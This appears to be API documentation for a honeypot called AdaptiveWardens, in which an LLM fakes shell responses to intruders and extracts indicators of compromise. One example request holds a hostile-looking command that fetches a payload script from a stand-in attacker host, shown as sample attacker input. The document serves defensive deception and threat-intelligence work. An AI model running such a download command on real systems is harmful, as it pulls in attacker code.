# AdaptiveWardens API Documentation

AdaptiveWardens exposes internal modular APIs using FastAPI. All APIs are scoped inside the `honeypot-internal` Docker network.

## 1. Sandbox Store API (`http://sandbox-store:8001`)

Responsible for persistence, session tracking, and the virtual file system.

### Create Session
- **Endpoint**: `POST /sessions/`
- **Body**:
  ```json
  {
    "session_id": "uuid",
    "source_ip": "192.168.1.50",
    "protocol": "ssh",
    "username": "root",
    "password": "password"
  }
  ```
- **Response**: `{"status": "created", "session_id": "uuid"}`

### Update Fake Filesystem
- **Endpoint**: `POST /files/{session_id}`
- **Body**:
  ```json
  {
    "path": "/root/secret.txt",
    "content": "Super secret data",
    "permissions": "600"
  }
  ```
- **Response**: `{"status": "written", "path": "/root/secret.txt"}`

### Push IOC Event
- **Endpoint**: `POST /iocs/{session_id}`
- **Body**:
  ```json
  {
    "ioc_type": "IP",
    "value": "185.22.44.1",
    "confidence": 0.9,
    "context": "AI Extracted"
  }
  ```
- **Response**: `{"status": "recorded"}`

## 2. AI Engine API (`http://ai-engine:8002`)

Responsible for contextualizing commands via LLMs.

### Generate Response
- **Endpoint**: `POST /generate-response`
- **Body**:
  ```json
  {
    "command": "wget http://bad-actor.net/payload.sh",
    "context": {
      "username": "root",
      "current_directory": "/tmp"
    },
    "history": [
      {"command": "cd /tmp", "output": ""}
    ]
  }
  ```
- **Response**:
  ```json
  {
    "response": "Resolving bad-actor.net... connected.\nHTTP request sent, awaiting response... 200 OK\n...",
    "cached": false,
    "iocs": [
      {"ioc_type": "URL", "value": "http://bad-actor.net/payload.sh", "confidence": 1.0}
    ],
    "mitre_techniques": [
      {"technique_id": "T1105", "technique_name": "Ingress Tool Transfer", "tactic": "Command and Control"}
    ]
  }
  ```

### Health Check (Global)
- **Endpoint**: `GET /health`
- **Response**: `{"status": "healthy", "service": "X"}`
